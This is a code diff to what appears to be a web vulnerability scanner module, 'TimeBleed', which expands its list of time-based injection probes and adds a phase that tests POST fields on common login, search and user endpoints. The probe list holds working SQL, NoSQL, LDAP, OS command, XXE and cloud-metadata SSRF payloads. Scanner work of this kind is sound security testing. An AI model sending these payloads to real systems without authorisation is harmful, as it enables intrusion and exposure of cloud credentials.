@@ -7,39 +7,54 @@ import json
 from pathlib import Path
 
 PROBES = [
-    # MySQL sleep
-    ("safe",  "' OR SLEEP(5)-- -",                          "sql_mysql"),
-    ("safe",  "1 AND SLEEP(5)-- -",                         "sql_mysql_num"),
-    ("safe",  "' AND SLEEP(5) AND '1'='1",                  "sql_mysql_and"),
-    # PostgreSQL sleep
-    ("safe",  "' || pg_sleep(5) || '",                      "sql_postgres"),
-    ("safe",  "1; SELECT pg_sleep(5)-- -",                  "sql_postgres_stacked"),
-    # MSSQL delay
-    ("safe",  "'; WAITFOR DELAY '0:0:5'--",                 "sql_mssql"),
-    ("safe",  "1; WAITFOR DELAY '0:0:5'--",                 "sql_mssql_num"),
-    # MySQL subquery
-    ("safe",  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "sql_mysql_sub"),
-    # Oracle (no-op if Oracle not present)
-    ("safe",  "' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",   "sql_oracle"),
-    # SQLite randomblob (CPU spin, not a true sleep — included for coverage)
-    ("safe",  "1 AND (SELECT COUNT(*) FROM sqlite_master t1, sqlite_master t2, sqlite_master t3)>0 AND SLEEP(5)-- -", "sql_sqlite"),
-    # OS command injection
-    ("safe",  ";sleep 5;",                                   "cmd_unix_semicolon"),
-    ("safe",  "|sleep 5|",                                   "cmd_unix_pipe"),
-    ("safe",  "$(sleep 5)",                                  "cmd_unix_subshell"),
-    ("safe",  "&& sleep 5 &&",                               "cmd_unix_and"),
-    ("safe",  "`sleep 5`",                                   "cmd_unix_backtick"),
-    ("safe",  "%0asleep%205",                                "cmd_unix_newline"),
-    # Windows command injection
-    ("safe",  "& timeout /t 5 &",                           "cmd_windows_timeout"),
-    ("safe",  "| timeout /t 5",                             "cmd_windows_pipe"),
-    # NoSQL / MongoDB
-    ('{"a":1}', '{"$where":"sleep(5000)"}',                 "nosql_mongo_where"),
-    ('{"a":1}', '{"$where":"function(){sleep(5000)}"}',     "nosql_mongo_fn"),
-    # LDAP injection (blind)
-    ("safe",  "*(|(objectClass=*))",                        "ldap_blind"),
-    # XML / XXE timing
-    ("safe",  "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://127.0.0.1:12345/'>]><x>&xxe;</x>", "xxe_ssrf_timing"),
+    # ── MySQL ────────────────────────────────────────────────────────────────
+    ("safe",  "' OR SLEEP(5)-- -",                              "sql_mysql"),
+    ("safe",  "1 AND SLEEP(5)-- -",                             "sql_mysql_num"),
+    ("safe",  "' AND SLEEP(5) AND '1'='1",                      "sql_mysql_and"),
+    ("safe",  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",  "sql_mysql_sub"),
+    ("safe",  "1 OR IF(1=1,SLEEP(5),0)-- -",                   "sql_mysql_if"),
+    # ── PostgreSQL ────────────────────────────────────────────────────────────
+    ("safe",  "' || pg_sleep(5) || '",                          "sql_postgres"),
+    ("safe",  "1; SELECT pg_sleep(5)-- -",                      "sql_postgres_stacked"),
+    ("safe",  "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -",        "sql_postgres_sub"),
+    # ── MSSQL ─────────────────────────────────────────────────────────────────
+    ("safe",  "'; WAITFOR DELAY '0:0:5'--",                     "sql_mssql"),
+    ("safe",  "1; WAITFOR DELAY '0:0:5'--",                     "sql_mssql_num"),
+    ("safe",  "1); WAITFOR DELAY '0:0:5'--",                    "sql_mssql_paren"),
+    # ── Oracle ────────────────────────────────────────────────────────────────
+    ("safe",  "' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",       "sql_oracle"),
+    ("safe",  "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",    "sql_oracle_num"),
+    # ── SQLite ────────────────────────────────────────────────────────────────
+    ("safe",  "1 AND (SELECT COUNT(*) FROM sqlite_master t1,sqlite_master t2,sqlite_master t3)>0 AND SLEEP(5)-- -",
+                                                                  "sql_sqlite"),
+    # ── DB2 ───────────────────────────────────────────────────────────────────
+    ("safe",  "'; CALL DBMS_ALERT.SLEEP(5)--",                  "sql_db2"),
+    # ── OS command injection — Unix ───────────────────────────────────────────
+    ("safe",  ";sleep 5;",                                       "cmd_unix_semicolon"),
+    ("safe",  "|sleep 5|",                                       "cmd_unix_pipe"),
+    ("safe",  "$(sleep 5)",                                      "cmd_unix_subshell"),
+    ("safe",  "&& sleep 5 &&",                                   "cmd_unix_and"),
+    ("safe",  "`sleep 5`",                                       "cmd_unix_backtick"),
+    ("safe",  "%0asleep%205",                                    "cmd_unix_newline"),
+    ("safe",  "1|sleep${IFS}5",                                  "cmd_unix_ifs"),
+    ("safe",  "1;ping${IFS}-c${IFS}5${IFS}127.0.0.1",           "cmd_unix_ping"),
+    # ── OS command injection — Windows ────────────────────────────────────────
+    ("safe",  "& timeout /t 5 &",                                "cmd_windows_timeout"),
+    ("safe",  "| timeout /t 5",                                  "cmd_windows_pipe"),
+    ("safe",  "& ping -n 6 127.0.0.1 &",                        "cmd_windows_ping"),
+    # ── NoSQL / MongoDB ───────────────────────────────────────────────────────
+    ('{"a":1}', '{"$where":"sleep(5000)"}',                      "nosql_mongo_where"),
+    ('{"a":1}', '{"$where":"function(){sleep(5000)}"}',          "nosql_mongo_fn"),
+    ('1',       '{"$regex":"((a+)+)$"}',                         "nosql_mongo_redos"),
+    # ── LDAP injection (blind) ────────────────────────────────────────────────
+    ("safe",  "*(|(objectClass=*))",                             "ldap_blind"),
+    # ── XXE / SSRF timing via localhost ──────────────────────────────────────
+    ("safe",  "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://127.0.0.1:12345/'>]><x>&xxe;</x>",
+                                                                  "xxe_ssrf_timing"),
+    # ── Cloud metadata SSRF timing ────────────────────────────────────────────
+    ("safe",  "http://169.254.169.254/latest/meta-data/",        "ssrf_aws_metadata"),
+    ("safe",  "http://metadata.google.internal/computeMetadata/v1/",
+                                                                  "ssrf_gcp_metadata"),
 ]
 
 GET_PARAMS = [
@@ -65,12 +80,16 @@ POST_ENDPOINTS = [
 ]
 
 
+SLEEP_SECS = 5  # Expected sleep duration for all time-based probes
+
+
 class TimeBleed:
     def __init__(self, url):
-        self.url = url
-        self.findings = []
-        self.jitter = None
+        self.url         = url
+        self.findings    = []
+        self.jitter      = None
         self.target_base = '/'.join(url.split('/')[:3])
+        self._dedup      = set()  # Prevent duplicate findings
 
     async def t_req(self, sess, params=None, data=None, headers=None, method='GET'):
         t0 = time.perf_counter()
@@ -199,6 +218,84 @@ class TimeBleed:
                 self._record_finding(header_name, cat, treat, tc, times, tmed, delta, 'HTTP header')
                 break
 
+    async def test_post_body(self, sess, path: str, field: str) -> None:
+        """Probe a single POST field with every timing payload."""
+        base_url = self.target_base
+        for _, payload, probe_type in PROBES:
+            if payload.startswith("{"):
+                continue  # JSON payloads handled separately
+            body_data = {field: payload}
+            t0 = time.monotonic()
+            try:
+                async with sess.post(
+                    base_url + path,
+                    json=body_data,
+                    headers={"User-Agent": "Mozilla/5.0"},
+                    ssl=False, allow_redirects=False,
+                    timeout=aiohttp.ClientTimeout(total=SLEEP_SECS + 7),
+                ) as r:
+                    await r.text(errors="ignore")
+                    elapsed = time.monotonic() - t0
+                    status  = r.status
+            except Exception:
+                continue
+            await asyncio.sleep(0.08)
+            if status == 404:
+                break  # path not found, skip remaining payloads
+            if elapsed >= SLEEP_SECS * 0.8:
+                # Validate with a safe baseline POST to confirm it's not slow by default
+                t_base0 = time.monotonic()
+                try:
+                    async with sess.post(
+                        base_url + path, json={field: "safe_test_value"},
+                        headers={"User-Agent": "Mozilla/5.0"},
+                        ssl=False, allow_redirects=False,
+                        timeout=aiohttp.ClientTimeout(total=15),
+                    ) as rb:
+                        await rb.text(errors="ignore")
+                        baseline = time.monotonic() - t_base0
+                except Exception:
+                    baseline = 0.0
+                if elapsed > baseline + (SLEEP_SECS * 0.6):
+                    key = f"post_{path}_{field}_{probe_type}"
+                    if key in self._dedup:
+                        continue
+                    self._dedup.add(key)
+                    self.findings.append({
+                        "type": "TIME_BASED_INJECTION_POST",
+                        "subtype": probe_type,
+                        "url": base_url + path,
+                        "method": "POST",
+                        "field": field,
+                        "payload": payload,
+                        "elapsed_s": round(elapsed, 2),
+                        "baseline_s": round(baseline, 2),
+                        "delta_s":   round(elapsed - baseline, 2),
+                        "http_status": status,
+                        "severity": "CRITICAL",
+                        "confidence": 89,
+                        "detail": (
+                            f"Time-based injection in POST field '{field}' at {path}. "
+                            f"Payload '{payload[:60]}' caused {elapsed:.2f}s delay "
+                            f"vs {baseline:.2f}s baseline. Type: {probe_type}."
+                        ),
+                        "proof": (
+                            f"POST {base_url}{path} field='{field}'\n"
+                            f"  Payload: {payload[:80]}\n"
+                            f"  Response time: {elapsed:.2f}s  Baseline: {baseline:.2f}s  "
+                            f"Delta: {elapsed - baseline:.2f}s\n"
+                            f"  Type: {probe_type}"
+                        ),
+                        "remediation": (
+                            "1. Use parameterised queries/prepared statements — never concatenate user input.\n"
+                            "2. Validate and whitelist all input types (numeric, alphanumeric).\n"
+                            "3. Apply per-query execution timeouts in the DB layer.\n"
+                            "4. Log and alert on abnormally slow queries."
+                        ),
+                    })
+                    print(f"  [CRITICAL] POST time-based injection: {path} field={field} "
+                          f"elapsed={elapsed:.2f}s baseline={baseline:.2f}s ({probe_type})")
+
     async def run(self):
         conn = aiohttp.TCPConnector(limit=5, ssl=False)
         async with aiohttp.ClientSession(
@@ -211,15 +308,33 @@ class TimeBleed:
                 print(f"[X] Baseline failed: {e} — skipping TimeBleed")
                 return self.findings
 
-            # GET parameter injection
+            # Phase 1: GET parameter injection
             print("\n[*] Phase 1: GET parameter injection")
             for p in GET_PARAMS:
                 await self.test_get_param(sess, p)
 
-            # HTTP header injection
+            # Phase 2: HTTP header injection
             print("\n[*] Phase 2: HTTP header injection")
             for hdr in HEADERS_TO_INJECT:
                 await self.test_header_injection(sess, hdr)
+
+            # Phase 3: POST body field injection
+            print("\n[*] Phase 3: POST body field injection")
+            post_targets = [
+                ("/api/login",     ["username", "password", "email"]),
+                ("/api/search",    ["q", "query", "search", "keyword"]),
+                ("/api/users",     ["id", "user_id", "name", "email"]),
+                ("/login",         ["username", "password"]),
+                ("/api/register",  ["email", "username", "name"]),
+                ("/api/contact",   ["message", "subject", "email"]),
+                ("/api/v1/users",  ["id", "email", "name"]),
+                ("/api/report",    ["target", "host", "domain", "query"]),
+                ("/api/feedback",  ["message", "content", "body"]),
+                ("/api/filter",    ["q", "filter", "category", "tag"]),
+            ]
+            for path, fields in post_targets:
+                for field in fields:
+                    await self.test_post_body(sess, path, field)
 
         return self.findings
 
